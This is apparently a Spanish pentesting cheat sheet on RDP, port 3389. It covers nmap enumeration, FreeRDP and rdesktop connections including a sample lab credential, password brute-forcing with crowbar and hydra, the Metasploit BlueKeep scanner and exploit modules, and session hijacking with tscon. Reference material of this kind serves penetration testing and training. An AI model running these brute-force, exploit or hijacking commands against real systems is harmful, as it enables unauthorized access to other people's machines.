---
title: RDP (Remote Desktop Protocol - Puerto 3389 TCP/UDP)
pubDate: '2026-08-26'
---

## ¿Qué es RDP?
**Remote Desktop Protocol (RDP)** es el protocolo de escritorio remoto nativo de Windows. Permite a un usuario controlar visualmente una máquina a través de la red. Para un atacante, es el objetivo ideal ya que proporciona acceso total a la interfaz gráfica (GUI) del sistema.

### Riesgos principales
1. **Vulnerabilidades de ejecución (RCE):** Fallos históricos como BlueKeep (CVE-2019-0708) permiten el control total del sistema sin credenciales previas.
2. **Fuerza Bruta / Password Spraying:** Si no hay políticas estrictas de bloqueo de cuentas, se pueden validar credenciales de forma masiva.
3. **Fuga de información:** El servicio expone nombres NetBIOS, nombres de dominio AD y versiones exactas del sistema operativo antes de autenticar.

---

## 🔎 1. Enumeración y Scripts Nmap

```bash
# Comprobar métodos de cifrado, NTLM Info y scripts generales de RDP
nmap -p 3389 -sV -sC --script="rdp-enum-encryption,rdp-ntlm-info,rdp-vuln-ms12-020,rdp*" <TARGET_IP>
```
* **`rdp-ntlm-info`:** Revela nombre del host, dominio interno de Active Directory y versión del SO.

### Auditoría de Seguridad con `rdp-sec-check`
Herramienta en Perl para auditar algoritmos de cifrado soportados (SSL, CredSSP, RDP nativo) y configuraciones NLA (Network Level Authentication):
```bash
# Instalación de dependencias
sudo cpan App::cpanminus
sudo cpanm Encoding::BER

# Clonado y ejecución
git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check
./rdp-sec-check.pl <TARGET_IP>
```

---

## 🚀 2. Conexión Remota (`xfreerdp` / `rdesktop`)

### Opción A: `xfreerdp3` (FreeRDP)
Es la herramienta más moderna y versátil para escritorios remotos desde Linux:

```bash
# Conexión estándar
xfreerdp3 /u:<usuario> /p:"<password>" /v:<TARGET_IP> /cert:ignore

# Conexión con usuario de Dominio
xfreerdp3 /u:<usuario> /d:<dominio> /p:"<password>" /v:<TARGET_IP> /cert:ignore

# Compartición de carpeta local (mapea /tmp de Kali en el explorador de Windows)
xfreerdp3 /u:<usuario> /p:"<password>" /v:<TARGET_IP> /cert:ignore /drive:kali,/tmp

# Conexión dinámica ajustando resolución y rendimiento
xfreerdp3 /u:<usuario> /p:"<password>" /v:<TARGET_IP> /dynamic-resolution +clipboard /cert:ignore
```

### Opción B: `rdesktop`
Alternativa directa y ligera (ideal cuando FreeRDP da problemas de renderizado o certificados):

```bash
# Conexión estándar (sin dominio)
rdesktop -u <usuario> -p '<password>' -g 1024x768 <TARGET_IP>

# Conexión con usuario de Dominio
rdesktop -u <usuario> -d <dominio> -p '<password>' -g 1024x768 <TARGET_IP>

# Ejemplo real en entorno de laboratorio HTB:
rdesktop -u Administrator -d inlanefreight.htb -p 'AnotherC0mpl3xP47141' -g 1024x768 10.129.155.217

# Compartición de carpeta local
rdesktop -u <usuario> -p '<password>' -g 1024x768 -r disk:kali=/tmp <TARGET_IP>
```

---

## 🔑 3. Ataques de Credenciales

```bash
# Crowbar (Específicamente optimizado para RDP)
crowbar -b rdp -s <TARGET_IP>/32 -u <usuario> -C /usr/share/wordlists/rockyou.txt

# Hydra
hydra -L usuarios.txt -P passwords.txt rdp://<TARGET_IP> -vV
```

---

## ⚠️ 4. Vulnerabilidades Críticas

### BlueKeep (CVE-2019-0708)
Afecta a Windows 7, Windows Server 2008 y 2008 R2. Permite ejecución remota de código como `NT AUTHORITY\SYSTEM` sin interacción del usuario:
```bash
# Escáner de vulnerabilidad en Metasploit
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS <TARGET_IP>
run

# Exploit
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
```

---

## 🛠️ 5. Post-Explotación: Session Hijacking (Secuestro de Sesión)

Si dispones de privilegios de Administrador local en la máquina, puedes secuestrar sesiones activas de otros usuarios conectados sin conocer sus contraseñas:

```powershell
# 1. Listar usuarios conectados y su identificador de sesión
query user

# 2. Secuestrar la sesión activa (ej. sesión ID 2) hacia tu consola actual
tscon 2 /dest:console
```
